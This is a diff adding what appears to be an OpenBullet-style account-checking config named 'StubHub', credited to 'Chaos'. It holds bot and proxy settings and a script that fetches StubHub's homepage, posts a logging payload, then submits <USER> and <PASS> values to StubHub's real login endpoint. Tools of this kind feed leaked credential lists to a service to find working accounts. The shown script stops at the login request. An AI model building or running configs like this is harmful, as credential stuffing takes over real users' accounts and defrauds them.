@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "StubHub",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-22T01:21:34.8557482+00:00",
+  "AdditionalInfo": "",
+  "Author": "Chaos",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.stubhub.com" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#VALIDATE REQUEST POST "https://www.stubhub.com/bfx/api/logging" AutoRedirect=TRUE 
+  CONTENT "[{\"tag\":\"perf\",\"storeId\":1,\"url\":\"/\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36\",\"mark-content-loaded\":814.1999999934342,\"mark-major-scripts-loaded\":1095.8000000100583,\"mark-react-mounted\":1249.4000000006054,\"first-paint\":984.9000000103842,\"first-contentful-paint\":984.9000000103842,\"clientTS\":1526951925946,\"level\":\"info\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.stubhub.com/" 
+  HEADER "origin: https://www.stubhub.com" 
+REQUEST POST "https://iam.stubhub.com/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&tmRefID=d686940c2143452a8886d7c1f5bbec66" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://www.stubhub.com/my/profile/" 
+  HEADER "com-stubhub-dye-path: d4e9af3f709b41399f552bc97cf629ae,f27a9561d0d44c0ca6fa756d7bf86b92" 
+  HEADER "Origin: https://www.stubhub.com" 
